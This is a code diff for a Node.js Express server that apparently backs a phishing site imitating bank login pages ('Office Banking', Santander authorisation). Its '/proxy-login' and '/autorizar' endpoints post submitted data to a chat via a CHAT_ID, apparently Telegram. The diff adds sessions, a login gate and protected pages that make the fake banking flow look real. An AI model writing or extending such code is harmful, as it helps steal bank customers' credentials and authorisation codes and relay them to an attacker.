@@ -2,6 +2,8 @@ const express = require("express");
 const cors = require("cors");
 const fs = require("fs");
 const path = require("path");
+const session = require("express-session"); // ✅ agregado
+
 // Si tu Node es <18, instala node-fetch y descomenta:
 // const fetch = require("node-fetch");
 
@@ -9,6 +11,23 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, "public")));
+
+// ✅ Configuración de sesión con expiración de 5 minutos
+app.use(session({
+  secret: "clave-secreta-super-segura", // cámbiala por algo único
+  resave: false,
+  saveUninitialized: false,
+  cookie: { maxAge: 5 * 60 * 1000 } // 5 minutos
+}));
+
+// ✅ Middleware para proteger rutas
+function requireLogin(req, res, next) {
+  if (req.session && req.session.autenticado) {
+    next();
+  } else {
+    res.redirect("/"); // redirige al login si no hay sesión
+  }
+}
 
 // Endpoint para leer configuración
 app.get("/config", (req, res) => {
@@ -27,8 +46,8 @@ app.get("/admin", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "admin.html"));
 });
 
-// Decidir qué página de autorización mostrar
-app.get("/autorizacion", (req, res) => {
+// Decidir qué página de autorización mostrar (protegida)
+app.get("/autorizacion", requireLogin, (req, res) => {
   const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
 
   if (cfg.tipoAutorizacion === "santander") {
@@ -54,7 +73,6 @@ app.post("/autorizar", async (req, res) => {
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
 
-    // ✅ Mensaje diferenciado
     res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
   } catch (err) {
     res.status(500).json({ status: "error", error: err.message });
@@ -79,16 +97,30 @@ app.post("/proxy-login", async (req, res) => {
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
 
-    // ✅ Mensaje diferenciado
+    // ✅ Aquí marcamos la sesión como autenticada
+    req.session.autenticado = true;
+
     res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
   } catch (err) {
     res.status(500).json({ status: "error", error: err.message });
   }
 });
 
+// ✅ Logout para cerrar sesión
+app.get("/salir", (req, res) => {
+  req.session.destroy(err => {
+    res.redirect("/"); // vuelve al login
+  });
+});
+
 // Servir index.html por defecto
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
+});
+
+// ✅ Ruta protegida para productos
+app.get("/productos", requireLogin, (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "productos.html"));
 });
 
 const PORT = process.env.PORT || 3000;
